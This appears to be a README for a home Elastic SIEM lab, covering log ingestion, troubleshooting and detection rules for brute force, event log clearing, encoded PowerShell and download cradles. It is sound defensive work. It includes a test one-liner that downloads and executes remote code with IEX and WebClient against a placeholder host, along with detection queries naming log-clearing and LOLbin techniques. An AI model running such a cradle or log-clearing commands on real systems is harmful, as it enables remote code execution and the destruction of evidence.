# Home SIEM Lab – Elastic Stack Detection Pipeline

## Objective
Build a functional SIEM environment to ingest Windows endpoint logs, validate telemetry, and develop detection rules for suspicious activity.

---

## Lab Architecture

Windows 11 VM (Endpoint)  
↓  
Elastic Agent (Log Collection)  
↓  
Fleet Server (Management Layer)  
↓  
Elasticsearch (Data Storage)  
↓  
Kibana (Visualization & Detection)  

---

## Environment

- VMware Workstation (Virtualized lab)
- Ubuntu Server (Elastic Stack host)
- Windows 11 VM (log source)
- Elastic Stack:
  - Elasticsearch
  - Kibana
  - Fleet Server
  - Elastic Agent

---

## Implementation

### SIEM Deployment
- Installed and configured Elasticsearch on Ubuntu
- Set up Kibana and enabled remote access (0.0.0.0)
- Deployed Fleet Server on Ubuntu
- Installed Elastic Agent on Windows 11 VM
- Connected endpoint to Fleet for centralized management

---

### Log Ingestion Pipeline

Successfully built a working pipeline:

Windows Event Logs  
→ Elastic Agent  
→ Fleet Server  
→ Elasticsearch  
→ Kibana  

Validated ingestion of Windows Security logs.

---

## Detection Engineering

### Detection Write-Ups

Detailed detection engineering write-ups are stored in the `detections/` folder.

| Detection | Technique | Data Source | Status |
|---|---|---|---|
| [Windows Event Log Clearing](detections/windows-event-log-clearing.md) | T1070.001 - Clear Windows Event Logs | Windows Security Event ID 4688 | Validated |

### Failed Login Detection Rule

**Objective:** Detect brute-force or unauthorized access attempts.

**Query:**
```
event.code: 4625 and winlog.channel: "Security" and winlog.computer_name: "DesktopWin11.THE.WIRED"
```

**Rule Logic:**
- Threshold: 3 failed logins  
- Time window: 5 minutes  
- Runs every: 1 minute  

**Key Adjustment:**
- Initially set to 5 attempts  
- Reduced to 3 due to default Windows account lockout behavior  

✅ Successfully triggered alerts through simulated failed login attempts

---


### Windows Event Log Clearing Detection

**Objective:** Detect attempts to clear Windows Event Logs using `wevtutil.exe`.

**Query:**
```kql
event.action: "created-process" and event.code: "4688" and process.name.caseless: "wevtutil.exe" and process.args: "cl"
```

**High-Confidence Query:**
```kql
event.action: "created-process" and event.code: "4688" and process.name.caseless: "wevtutil.exe" and process.args: "cl" and process.parent.name.caseless: "powershell.exe"
```

**Key Insight:**
- Detects use of a native Windows utility to clear event logs
- Maps to MITRE ATT&CK T1070.001 - Clear Windows Event Logs
- Uses Windows Security Event ID 4688 process creation telemetry
- Parent process context showed PowerShell launching `wevtutil.exe`, strengthening the investigation story

✅ Successfully triggered an Elastic Security alert through simulated event log clearing

**Full write-up:** [detections/windows-event-log-clearing.md](detections/windows-event-log-clearing.md)

---

### PowerShell Parent-Child Process Detection

**Objective:** Detect processes spawned by PowerShell, indicating potential script-based execution.

**Query (Baseline):**
```
event.code: "4688" AND process.parent.name: "powershell.exe"
```

**Query (High Fidelity):**
```
event.code: "4688" AND process.parent.name: "powershell.exe" AND process.name: ("cmd.exe" OR "rundll32.exe" OR "mshta.exe" OR "wscript.exe")
```

**Key Insight:**
- Broad detection provides visibility into PowerShell activity
- High-fidelity detection targets commonly abused binaries (LOLbins)

✅ Successfully triggered alerts using simulated process execution

---

### Encoded PowerShell Command Detection

**Objective:** Detect obfuscated PowerShell execution using encoded commands.

**Query:**
```
event.code: "4104" AND powershell.file.script_block_text: ("-enc" OR "-encodedcommand")
```

**Key Insight:**
- Encoded commands are commonly used to evade detection
- Detection depends on Script Block Logging (Event ID 4104)

✅ Successfully triggered alerts using encoded command execution

---

### PowerShell Download Cradle Detection (Fileless Malware)

**Objective:** Detect fileless malware techniques using PowerShell to download and execute remote code in memory.

**Query:**
```
event.code: "4104" AND powershell.file.script_block_text: ("IEX" AND "WebClient")
```

**Testing:**
```
IEX (New-Object Net.WebClient).DownloadString("http://example.com")
```

**Key Insight:**
- Represents real-world attacker behavior (fileless execution)
- Executes payloads in memory without writing to disk
- Relies on Script Block Logging visibility

✅ Successfully triggered alerts through simulated fileless execution

---

## PowerShell Logging Investigation

### Objective
Understand differences in PowerShell event logging and improve detection accuracy.

### Observations
- Event ID 400 → PowerShell session start (no command visibility)  
- Event ID 4104 → Script Block Logging (captures command content)  

### Issue
Initial detections triggered on PowerShell session creation rather than actual command execution.

### Findings
- Opening PowerShell does not guarantee command visibility  
- Script Block Logging must be enabled for useful telemetry  
- Even with logging, some activity may not be captured consistently  

### Example Query
```
winlog.computer_name: "DesktopWin11.THE.WIRED" AND event.code: (400 OR 4104 OR 4105 OR 4106)
```

### Lesson
Detection engineering must align with **actual telemetry behavior**, not assumptions.

---

## Troubleshooting & Problem Solving

### Issue: Windows Logs Not Appearing in Kibana
**Root Cause:** Fleet output did not match Kibana host  
**Resolution:** Corrected configuration  

---

### Issue: Kibana Became Inaccessible
**Root Cause:** DHCP IP change on Ubuntu server  
**Resolution:** Updated configuration  

---

### Issue: Elastic Installation Failed
**Root Cause:** Insufficient disk space (20GB)  
**Resolution:** Expanded disk to 60GB and resized filesystem  

---

### Issue: Detection Rule Not Triggering
**Root Cause:** Incorrect data view  
**Resolution:** Updated to logs-*  

---

### Issue: PowerShell Detection Testing Failed Initially
**Root Cause:** Command executed in incorrect shell context  
**Resolution:** Re-ran tests in proper PowerShell environment  

---

## Detection Coverage (MITRE ATT&CK)

This lab aligns detection logic with the MITRE ATT&CK framework, which maps real-world adversary behavior into tactics (objectives) and techniques (methods used to achieve those objectives).

### Covered Tactics & Techniques

- **T1070.001 – Clear Windows Event Logs (Defense Evasion)**
  - Detects use of `wevtutil.exe` with the `cl` argument to clear Windows Event Logs
  - Uses Windows Security Event ID 4688 process creation telemetry
  - Includes parent process context when launched from PowerShell

- **T1059.001 – PowerShell (Execution)**
  - Detects PowerShell activity using process creation telemetry and Script Block Logging

- **T1027 – Obfuscated/Encoded Files or Information (Defense Evasion)**
  - Detects use of encoded PowerShell commands (Event ID 4104)

- **T1105 – Ingress Tool Transfer (Command and Control)**
  - Detects download cradle activity using PowerShell (IEX + WebClient)

- **T1110 – Brute Force (Credential Access)**
  - Detects repeated failed login attempts (Event ID 4625)

### Purpose

Mapping detections to MITRE ATT&CK provides a standardized way to understand attacker behavior, evaluate detection coverage, and improve defensive strategies.

## Key Lessons Learned

- Detection rules must be validated against real telemetry  
- Logging gaps directly impact detection capability  
- PowerShell event IDs represent different behaviors  
- Infrastructure issues can silently break detection  
- Detection engineering requires iterative testing and refinement  
- Execution context affects testing accuracy  

---

## Current Status

✅ SIEM backend operational  
✅ Endpoint telemetry ingestion working  
✅ Detection rules tested and validated  
✅ Multiple behavioral detections implemented  

---

## Next Steps

- Improve Script Block Logging reliability  
- Expand into DNS/network telemetry (Pi-hole integration)  
- Correlate endpoint and network activity  
- Tune detection rules to reduce false positives  
